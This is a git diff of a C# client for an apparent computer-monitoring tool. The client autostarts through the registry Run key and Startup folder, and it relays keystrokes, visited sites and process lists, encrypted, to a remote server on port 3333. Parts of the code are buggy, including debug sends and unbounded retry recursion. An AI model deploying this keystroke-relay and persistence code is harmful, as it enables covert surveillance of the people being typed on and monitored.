@@ -12,6 +12,7 @@ using System.Windows.Forms;
 using IWshRuntimeLibrary;
 using System.Linq;
 using System.Runtime.CompilerServices;
+using System.Security.Cryptography;
 
 namespace ClientSide
 {
@@ -24,10 +25,10 @@ namespace ClientSide
 
         const string ID = "id";
         const string SETTING = "setting";
-        const string LIVE = "get current state";
+        const string LIVE = "start live mode";
         const string STOP_LIVE = "stop current state";
         const string REMOVE_CLIENT = "remove client";
-        const string LAST_REPORT = "last report";
+        const string LAST_REPORT = "send last report";
 
         private String id;
         private Socket clientSocket;
@@ -37,7 +38,7 @@ namespace ClientSide
         private DBclient dbs;
         private Setting set;
         private ClientForm clientForm;
-        public Boolean sendCurrentData;      
+        public Boolean sendCurrentData;
         string keyDate;
         public static Program program;
         ManageMonitor manageMonitor;
@@ -60,21 +61,55 @@ namespace ClientSide
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
-          
+
             // check if connect at first time or reconnect         
             if (!program.initialClient())
             {
                 program.connectToServer();
             }
-            
+            Thread interntAvilable = new Thread(checkInterntConnection);
+            interntAvilable.Start();
             Application.Run();
         }
+
+        public static void checkInterntConnection()
+        {
+            while (true)
+            {
+                Thread.Sleep(1000);
+                try
+                {
+                    using (var client = new WebClient())
+                    using (var stream = client.OpenRead("http://www.google.com"))
+                    {
+                        // try send data to server
+                        try {
+                            //   program.SendData(program.clientSocket, "check connection"); 
+                        }
+                        catch (SocketException ex) {
+                            break;
+                        }
+
+                    }
+
+                }
+                catch
+                {
+                    //           program.reConnect();
+
+                }
+
+
+            }
+
+        }
+
 
         private static void connectAtReStartComputer()
         {
             // The path to the key where Windows looks for startup applications
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            
+
             string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
             WshShell shell = new WshShell();
             string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
@@ -108,23 +143,23 @@ namespace ClientSide
                     return;
                 }
 
-                string data = Encoding.ASCII.GetString(buffer);            
+                string data = Encoding.ASCII.GetString(buffer);
 
                 var dataFromServer = data.Split(new[] { '\r', '\n', '\0' }, 2);
-                
+
                 DBclient DBInstance = DBclient.Instance;
 
                 switch (dataFromServer[0])
                 {
                     // Get uniqe id 
-                    case ID:                    
+                    case ID:
                         id = dataFromServer[1].Split('\r', '\n', '\0')[0];
-                        DBInstance.fillGeneralDetailsTable("id",id);
+                        DBInstance.fillGeneralDetailsTable("id", id);
                         //ShowErrorDialog("get id"); 
                         break;
 
                     // Get Setting to implement monitoring
-                    case SETTING: 
+                    case SETTING:
                         string setting = dataFromServer[1].Split('\0')[0];
                         setting = setting.Substring(setting.IndexOf("\n") + 1);
                         // save setting 
@@ -145,7 +180,7 @@ namespace ClientSide
 
                     // Stop live reporting mode
                     case LAST_REPORT:
-                        sendLastReport(clientSocket);                        
+                        sendLastReport(clientSocket);
                         break;
 
                     // Remove computer from monitoring
@@ -154,21 +189,17 @@ namespace ClientSide
                         break;
 
                     default:
-                        //ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
+                        // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                         break;
                 }
-                                      
+
                 buffer = new byte[clientSocket.ReceiveBufferSize];
                 clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
             }
-             
+
             catch (SocketException ex)
             {
-<<<<<<< HEAD
-                ShowErrorDialog("ReceiveCallback " + ex.Message);
-=======
                 ShowErrorDialog("ReceiveCallback - RECONNECT \n" + ex.Message);
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
                 reConnect();
             }
             catch (ObjectDisposedException ex)
@@ -179,9 +210,15 @@ namespace ClientSide
 
         private void sendLastReport(Socket socket)
         {
-            DBclient DBInstance = DBclient.Instance;
-            //string lastReport = DBInstance.getLastReport();
-            SendData(socket, "last report\rlastReport");
+
+            string lastReport = Report.getReportString();
+            if (lastReport == null)
+            {
+                SendData(socket, "last report\r" + "NO REPORT TO SHOW");
+            }
+            ShowErrorDialog("last reort is: " + lastReport);
+            SendData(socket, "sara ayash\r");
+            SendData(socket, "last report\r" + lastReport);
         }
 
         private void removeClient()
@@ -193,7 +230,7 @@ namespace ClientSide
             ShowErrorDialog("removeeeeeeeeeeee");
 
         }
-        
+
 
         private void stopLiveMode(Socket clientSocket)
         {
@@ -216,8 +253,8 @@ namespace ClientSide
 
         // set setting and here will play all triggers;
         private void playAllTrigers()
-        {          
-           
+        {
+
             //ShowErrorDialog("play all trigers");
 
             // Play all monitors
@@ -239,7 +276,7 @@ namespace ClientSide
 
             String[] paths = new string[] { @filepath, "files" };
             filepath = Path.Combine(paths);
-           
+
             if (!Directory.Exists(filepath))
             {
                 Directory.CreateDirectory(filepath);
@@ -249,9 +286,9 @@ namespace ClientSide
             if (System.IO.File.Exists(settingFile))
             {
                 System.IO.File.Delete(settingFile);
-               
+
             }
-            using (StreamWriter sw = System.IO.File.CreateText(settingFile));
+            using (StreamWriter sw = System.IO.File.CreateText(settingFile)) ;
             System.IO.File.WriteAllText(settingFile, name + "\r\n" + id + "\r\n" + setting);
 
 
@@ -269,7 +306,7 @@ namespace ClientSide
                 clientSocket.EndConnect(AR);
                 clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
 
-               // ShowErrorDialog("in ConnectCallback in socket: " + clientSocket.RemoteEndPoint);
+                // ShowErrorDialog("in ConnectCallback in socket: " + clientSocket.RemoteEndPoint);
                 if (id != null)
                     SendData(clientSocket, "id\r" + id);
                 else SendData(clientSocket, "name\r" + name);
@@ -277,7 +314,7 @@ namespace ClientSide
             }
             catch (SocketException ex)
             {
-                 ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);
+                ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);
 
                 reConnect();
 
@@ -327,7 +364,7 @@ namespace ClientSide
                 name = clientForm.clientName;
                 ip = clientForm.ip;
                 DBclient DBInstance = DBclient.Instance;
-                DBInstance.fillGeneralDetailsTable("name",name);
+                DBInstance.fillGeneralDetailsTable("name", name);
                 DBInstance.fillGeneralDetailsTable("ip", ip);
 
                 // Create new socket 
@@ -338,7 +375,7 @@ namespace ClientSide
                 IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                 // The function ConnectCallback set callback to receive and send 
                 clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
-                ShowErrorDialog("connect to ip: " + ip);
+                //ShowErrorDialog("connect to ip: " + ip);
             }
             catch (SocketException ex)
             {
@@ -360,7 +397,7 @@ namespace ClientSide
             else
                 return false;
         }
-    
+
         public static bool SocketConnected(Socket s)
         {
             bool part1 = s.Poll(1000, SelectMode.SelectRead);
@@ -370,7 +407,7 @@ namespace ClientSide
             else
                 return true;
         }
-      
+
         public static bool internetConnection()
         {
             try
@@ -393,13 +430,13 @@ namespace ClientSide
             string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
             string[] paths = new string[] { @filepath, "files" };
             filepath = Path.Combine(paths);
-            
+
             DirectoryInfo directory = new DirectoryInfo(filepath);//Assuming Test is your Folder
             //ShowErrorDialog("filepath is: \n" + filepath);
             string fileName = "setting_" + Environment.UserName + ".txt";
             if (Directory.Exists(filepath) && System.IO.File.Exists(Path.Combine(filepath, fileName)))
-            { 
-                
+            {
+
                 using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, fileName)))
                 {
                     name = sr.ReadLine();
@@ -409,7 +446,7 @@ namespace ClientSide
 
                     DBclient DBInstance = DBclient.Instance;
                     ip = DBInstance.getGeneralDetailsTable("ip");
-                    ShowErrorDialog("ipppp: "+ip);
+                    ShowErrorDialog("ipppp: " + ip);
                     string line = "";
                     while ((line = sr.ReadLine()) != null)
                     {
@@ -419,11 +456,11 @@ namespace ClientSide
                 }
                 reConnect();
                 playAllTrigers();
-                
+
                 return true;
             }
 
-             
+
             return false;
 
         }
@@ -435,46 +472,107 @@ namespace ClientSide
 
         public void SendData(Socket clientSocket, String data)
         {
+            
+ 
             try
             {
                 if (CheckConnection(clientSocket))
                 {
-                    //ShowErrorDialog("send: \r\n" + data);
-                    var sendData = Encoding.UTF8.GetBytes(data);
+                    string crypto = Crypto.Encrypt(data);
+                    string decrypto = Crypto.Decrypt(crypto);
+                    //ShowErrorDialog("Send: "+ crypto);
+                    var sendData = Encoding.UTF8.GetBytes(crypto);
                     clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
+
+                   
 
                 }
                 else {
-                    reConnect();
+                    //reConnect();
+                    SendData(clientSocket, data);
                 }
-               
+
             }
             catch (SocketException ex)
             {
                 if (!CheckConnection(clientSocket))
-                {      
-                    ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);                 
-                    reConnect();
+                {
+                    ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
+                    //reConnect();
                     SendData(clientSocket, data);
 
                 }
-           
+
 
                 //SendData(clientSocket, data);
             }
             catch (ObjectDisposedException ex)
             {
                 ShowErrorDialog("SendData send ObjectDisposedException \r\n" + ex.Message);
+                reConnect();
             }
         }
+         
+
+        //public void sendDataByParts(Socket clientSocket, string data)
+        //{
+        //    string subject = data.Split(new[] { '\r'}, 2)[0];
+        //    string testData = data.Split(new[] { '\r' }, 2).Last();
+        //    var sendData = Encoding.UTF8.GetBytes("start send data by parts\r" + subject + "\r");
+        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
+
+
+        //    string subData = "";
+        //    string subEncrypt = "";
+        //    int index = 0;
+        //    int length = 20;
+
+        //    bool lastPart = false;
+        //    while (!lastPart)
+        //    {
+
+        //        if ((index + length) > testData.Length)
+        //        {
+        //            length = testData.Length;
+        //            subData += testData.Substring(index, length);
+        //            lastPart = true;
+        //        }
+        //        else
+        //        {
+        //            subData += testData.Substring(index, index + length);
+        //        }
+
+
+        //        Byte[] subStringByte = Encoding.UTF8.GetBytes(testData);
+
+        //        subEncrypt = Crypto.Encryption(subData);
+        //        if (subEncrypt != string.Empty)
+        //        {
+        //            DBclient DBInstance = DBclient.Instance;
+        //            string id = DBInstance.getGeneralDetailsTable("id");
+
+        //            sendData = Encoding.UTF8.GetBytes("sub encrypt data\r" + id + "\r" + subEncrypt);
+        //            clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
+        //            index += length;
+        //            length += 20;
+        //        }
+
+
+
+        //    }
+
+
+        //    sendData = Encoding.UTF8.GetBytes("stop send data by parts\r" + id + "\r");
+        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
+
+
+        //}
+
+
 
         public void reConnect()
         {
-<<<<<<< HEAD
             try
-=======
-            try  
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
             {
 
                 // Create new socket 
@@ -486,6 +584,14 @@ namespace ClientSide
                 IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                 // The function ConnectCallback set callback to receive and send 
                 clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
+
+                // Play all monitors
+                if (manageMonitor == null)
+                {
+                    //manageMonitor = new ManageMonitor();
+                    //manageMonitor.playAllTriggers();
+                }
+            
             }
             catch (SocketException ex)
             {
@@ -494,21 +600,17 @@ namespace ClientSide
             }
             catch (ObjectDisposedException ex)
             {
-               ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
+                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
             }
-<<<<<<< HEAD
         }
-=======
-        } 
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
 
         public static void updateCurrentKeylogger(string word)
-        {           
-             
-                //ShowErrorDialog(word);
-                program.SendData(program.clientSocket, "current state\rkeyBoard\r"+ word);
-             
-           
+        {
+
+            //ShowErrorDialog(word);
+            program.SendData(program.clientSocket, "current state\rkeyBoard\r" + word);
+
+
         }
 
         public static void updateCurrentSite(string site)
@@ -516,20 +618,21 @@ namespace ClientSide
             // ShowErrorDialog("send site: \n"+site);
             //Console.WriteLine(site); 
             program.SendData(program.clientSocket, "current state\rsite\r" + site);
-          
-           
+
+
 
         }
-       
+
         public static void updateCurrentProcess(string proccess)
         {
-               // ShowErrorDialog("send proc: \n" + proccess);
-                program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);
-          
-            
+            // ShowErrorDialog("send proc: \n" + proccess);
+            program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);
+
+
 
         }
 
 
     }
 }
+
